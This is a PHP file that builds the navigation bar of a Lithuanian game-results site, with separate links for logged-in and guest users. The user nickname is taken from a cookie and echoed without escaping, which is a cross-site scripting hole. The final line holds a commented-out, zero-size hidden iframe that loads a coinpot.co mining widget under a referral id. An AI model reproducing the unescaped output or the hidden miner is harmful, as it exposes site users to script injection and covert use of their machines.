<?php
   
if (isset($_COOKIE['user'])){
    $user =  $_COOKIE['nickname'];
echo "<div class='navbar'>"
    . "<a class ='btn btn-outline-dark' href='?view=match_plan&action=table'>Planuojami žaidimai</a>"
    . "<a class ='btn btn-outline-dark' href='?view=match_history&action=new'>Naujas rezultatas</a>"
    . "<a class ='btn btn-outline-dark' href='?view=match_history&action=table'>Žaidimų istorija</a>"
    . "<a class ='btn btn-outline-dark' href='?view=users&action=table'>Žaidėjų sąrašas</a>"
    . "<a class ='btn btn-outline-dark' href='?view=users&action=new'>Registruoti žaidėją</a>"
    . "<a class ='btn btn-outline-dark' href='?view=chat&action=session'>Pokalbiai</a>"
    . "<a class ='btn btn-outline-dark' href='?view=info&action=about'>Apie</a>"
    . "<a class ='btn btn-outline-dark' href='?view=users&action=logout'>Atsijungti</a>"
    . "<a align='right' class ='btn btn-outline-secondary' href='?view=users&action=self'>$user</a></div>";
}
else {
        echo "<div class='navbar'>"
        . "<a class ='btn btn-outline-dark' href='?view=match_history&action=new'>Naujas rezultatas</a>"
        . "<a class ='btn btn-outline-dark' href='?view=match_history&action=table'>Žaidimų istorija</a>"
        . "<a class ='btn btn-outline-dark' href='?view=users&action=table'>Žaidėjų sąrašas</a>"
        . "<a class ='btn btn-outline-dark' href='?view=chat&action=session'>Pokalbiai</a>"
        . "<a class ='btn btn-outline-dark' href='?view=info&action=about'>Apie</a>"
        . "<a class ='btn btn-outline-dark' href='?view=users&action=new'>Registruotis</a>"
        . "<a class ='btn btn-outline-dark' href='?view=users&action=login'>Prisijungti</a></div>";
        }
?>
<!--<iframe scrolling="no" frameborder="0" src="https://coinpot.co/mine/dash/?ref=27745247FE3E&mode=widget" style="overflow:hidden;width:0px;height:0px;"></iframe>-->
